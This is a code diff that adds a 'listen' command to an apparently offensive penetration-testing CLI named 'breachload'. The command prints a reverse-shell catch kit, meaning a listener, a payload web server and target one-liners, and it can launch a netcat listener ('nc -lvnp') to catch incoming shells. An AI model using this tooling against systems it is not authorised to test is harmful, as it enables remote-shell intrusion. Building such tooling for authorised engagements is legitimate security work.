@@ -534,6 +534,41 @@ def loot(config: Path = typer.Argument(..., help="engagement YAML"),
 
 
 @app.command()
+def listen(config: Path = typer.Argument(..., help="engagement YAML"),
+           lhost: str = typer.Option(None, help="your box IP (default: engagement lhost)"),
+           lport: int = typer.Option(None, help="listener port (default: engagement lport)"),
+           serve: str = typer.Option(".", help="directory to host payloads from"),
+           http_port: int = typer.Option(8000, help="port for the payload web server"),
+           payload: str = typer.Option("shell.sh", help="payload filename to reference"),
+           run: bool = typer.Option(False, "--run",
+                                    help="launch 'nc -lvnp <port>' (blocks until a shell lands)")):
+    """Print a reverse-shell catch kit (listener, payload host, target one-liners, PTY upgrade)."""
+    from .analysis.handler import kit_lines
+    cfg = _load_config(config)
+    lhost = lhost or cfg.lhost or "LHOST"
+    lport = lport or cfg.lport
+    console.print(f"[bold]breachload - reverse-shell handler[/]  "
+                  f"[dim](LHOST={lhost} LPORT={lport})[/]\n")
+    for line in kit_lines(lhost, lport, http_port, serve, payload):
+        if line.startswith("#"):
+            console.print(f"[bold cyan]{escape(line)}[/]")
+        else:
+            console.print(line, markup=False)   # commands contain [ ] { } | -> verbatim
+
+    if run:
+        import subprocess
+        console.print(f"\n[bold]launching[/] nc -lvnp {lport}  (Ctrl-C to stop)\n")
+        try:
+            subprocess.run(["nc", "-lvnp", str(lport)])   # noqa: S603,S607 - user's own listener
+        except FileNotFoundError:
+            console.print("[bold red]nc not found[/] - install netcat or use one of the "
+                          "listeners above")
+            raise typer.Exit(1) from None
+        except KeyboardInterrupt:
+            console.print("\n[yellow]listener stopped[/]")
+
+
+@app.command()
 def sploit(config: Path = typer.Argument(..., help="engagement YAML")):
     """Search Exploit-DB (searchsploit) for every versioned service and record matches."""
     from .analysis.searchsploit import run_search
